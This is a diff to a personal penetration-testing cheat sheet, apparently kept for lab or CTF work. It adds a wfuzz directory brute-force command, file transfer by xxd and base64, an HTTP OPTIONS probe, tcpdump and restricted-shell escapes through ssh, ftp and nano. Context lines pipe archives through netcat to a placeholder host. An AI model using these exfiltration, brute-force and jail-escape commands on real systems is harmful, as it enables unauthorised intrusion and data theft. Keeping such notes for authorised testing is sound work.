@@ -5,6 +5,7 @@ https://tools.kali.org/tools-listing
     -dirb
     -gobuster
     -wfuzz
+        wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.110.38/FUZZ.php
     -niko
     -uniscan
 
@@ -24,6 +25,15 @@ https://tools.kali.org/tools-listing
     gzip -c /tmp/asroot | nc a.b.c.d 1234
     tar czp /tmp/directory | nc a.b.c.d 1234
     nc -l -p 1234 -q 1 < linpeas.sh 
+==transfer file xxd, base64
+    
+    xxd -p -c 36 binary
+    head binary.xxd
+    7f454c460101010000000000000000000200030001000000c08604083400
+    cat binary.xxd | xxd -r -p > binary
+
+    base64 -w 0 binary
+    echo -ne f0VMRgEBAQAAAAAAAAAAAAIAAwABA... | base64 -d > binary
 
 ===Tar file
 1) create
@@ -82,8 +92,11 @@ arp -a
 arp -e
 arp -n
 
-===hash
+===Crypt - uncrypt
 https://hashes.com/en/decrypt/hash
+cyberchef : gchq.github.io
+http://rumkin.com/tools
+
 
 === spawning shells
 https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
@@ -380,9 +393,7 @@ sed -n '/<div id="footer"/,/<\/div/p'
 
 
 ==nmap
-==crypt - uncrypt
 
-cyberchef : gchq.github.io
 
 
 ==Steganography
@@ -471,3 +482,37 @@ gdb-peda$ find "\xff\xe4" binary
 ===LFI Scan & Exploit Tool (@hc0d3r - P0cL4bs Team)
 https://tools.kali.org/web-applications/uniscan
 sudo uniscan
+
+
+
+
+
+===Identifier les méthodes HTTP autorisées
+
+
+curl -X OPTIONS http://example.org -i
+
+
+
+===tcpdump
+
+sudo tcpdump -i vboxnet0 icmp -X
+
+https://danielmiessler.com/study/tcpdump/
+
+
+===Escape jail
+
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash
+- rbash : ssh avida@192.168.110.38 -t "/bin/bash --noprofile"
+- ftp : 
+    -rbash-4.1$ ftp 
+    ftp> !
+    +rbash-4.1$ /bin/bash
+- nano :
+    nano -s /bin/bash
+    /bin/bash
+    ^T
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export SHELL=/bin/bash
+
